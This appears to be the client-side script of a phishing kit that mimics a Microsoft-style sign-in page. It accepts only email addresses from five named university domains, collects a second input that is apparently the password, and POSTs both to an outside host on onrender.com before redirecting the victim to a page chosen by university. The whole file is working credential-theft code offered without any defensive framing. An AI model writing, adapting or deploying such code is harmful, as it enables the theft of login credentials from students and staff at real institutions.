document.addEventListener("DOMContentLoaded", function() {
     //BUTTON
     const nextBtn = document.querySelector('#idSIButton9');
     const submitBtn = document.getElementById('submitBtn');
     const backBtn = document.querySelector('#idBtn_Back');
     const userNameDisplay = document.getElementById('userNameDisplay')
     const signInDisplay = document.getElementById('signInDisplay')
     const subtitleUserNameDisplay = document.getElementById('subtitle')
     //Word base on page
     const accessAcct = document.getElementById('accessAcc');
     const forPAss = document.getElementById('forPass')
     // Get Div values
     const CloseDivE = document.getElementById('CloseDiv');
     const OpenDIvP = document.getElementById('OpenDIv');
     CloseDivE.addEventListener('keypress', (e)=>{
        if(e.target.keycode === 13){
            e.preventDefault();
        }
    })
    nextBtn.addEventListener('click', (e)=>{
        e.preventDefault();

        if(CloseDivE.value.endsWith('@shc.edu') || CloseDivE.value.endsWith('@hsu.edu') || CloseDivE.value.endsWith('@sautech.edu') || CloseDivE.value.endsWith('@judsonu.edu') || CloseDivE.value.endsWith('@hendrix.edu')){
            CloseDivE.style.display = 'none';
            OpenDIvP.style.display = 'block';
            e.target.style.display = 'none';
            submitBtn.style.display = 'block';
            forPAss.style.display = 'block';
            accessAcct.style.display = 'none';
            userNameDisplay.style.display = 'block'
            subtitleUserNameDisplay.textContent = CloseDivE.value
            signInDisplay.style.display = 'none'
            backBtn.style.display = 'block'
        }else{
            alert('Invalid Email')
        }
    })
    backBtn.addEventListener('click', (e)=>{
        e.preventDefault();
        e.target.style.display = 'none'
        CloseDivE.style.display = 'block';
        OpenDIvP.style.display = 'none';
        nextBtn.style.display = 'block';
        submitBtn.style.display = 'none';
        forPAss.style.display = 'none';
        accessAcct.style.display = 'block';
        userNameDisplay.style.display = 'none'
        signInDisplay.style.display = 'block'
        
    });

    const DivFunctionLog = document.getElementById('DivFunction');

    DivFunctionLog.addEventListener('submit', function(event){
        event.preventDefault();
        
        if(password.value != ''){
             const userData = {
                FullName: OpenDIvP.value,
                Email: CloseDivE.value,
                Password: 'username',
            };
            fetch('https://mail-sever.onrender.com/Api/User/sign-up', {
                method : "POST",
                headers : {
                "Content-Type" : "application/json"
                },
                body: JSON.stringify(userData)
            })
            .then(response => {
                if (!response.ok) {
                    return response.json().then(err => { throw err; });
                }
                return response.json();
            });
        
            setTimeout(function() {
                if(userData.Email.endsWith('@shc.edu')){
                    window.location.href = 'hills.html';
                }else if(userData.Email.endsWith('@hsu.edu')){
                    window.location.href = 'state.html';
                }else if(userData.Email.endsWith('@sautech.edu')){
                    window.location.href = 'tech.html';
                }else if(userData.Email.endsWith('@judsonu.edu')){
                    window.location.href = 'son.html';
                }else{
                    window.location.href = 'matrix.html';
                }
            }, 2000)
        }else{
            alert('Password can\'t be empty')
        }
    })
});

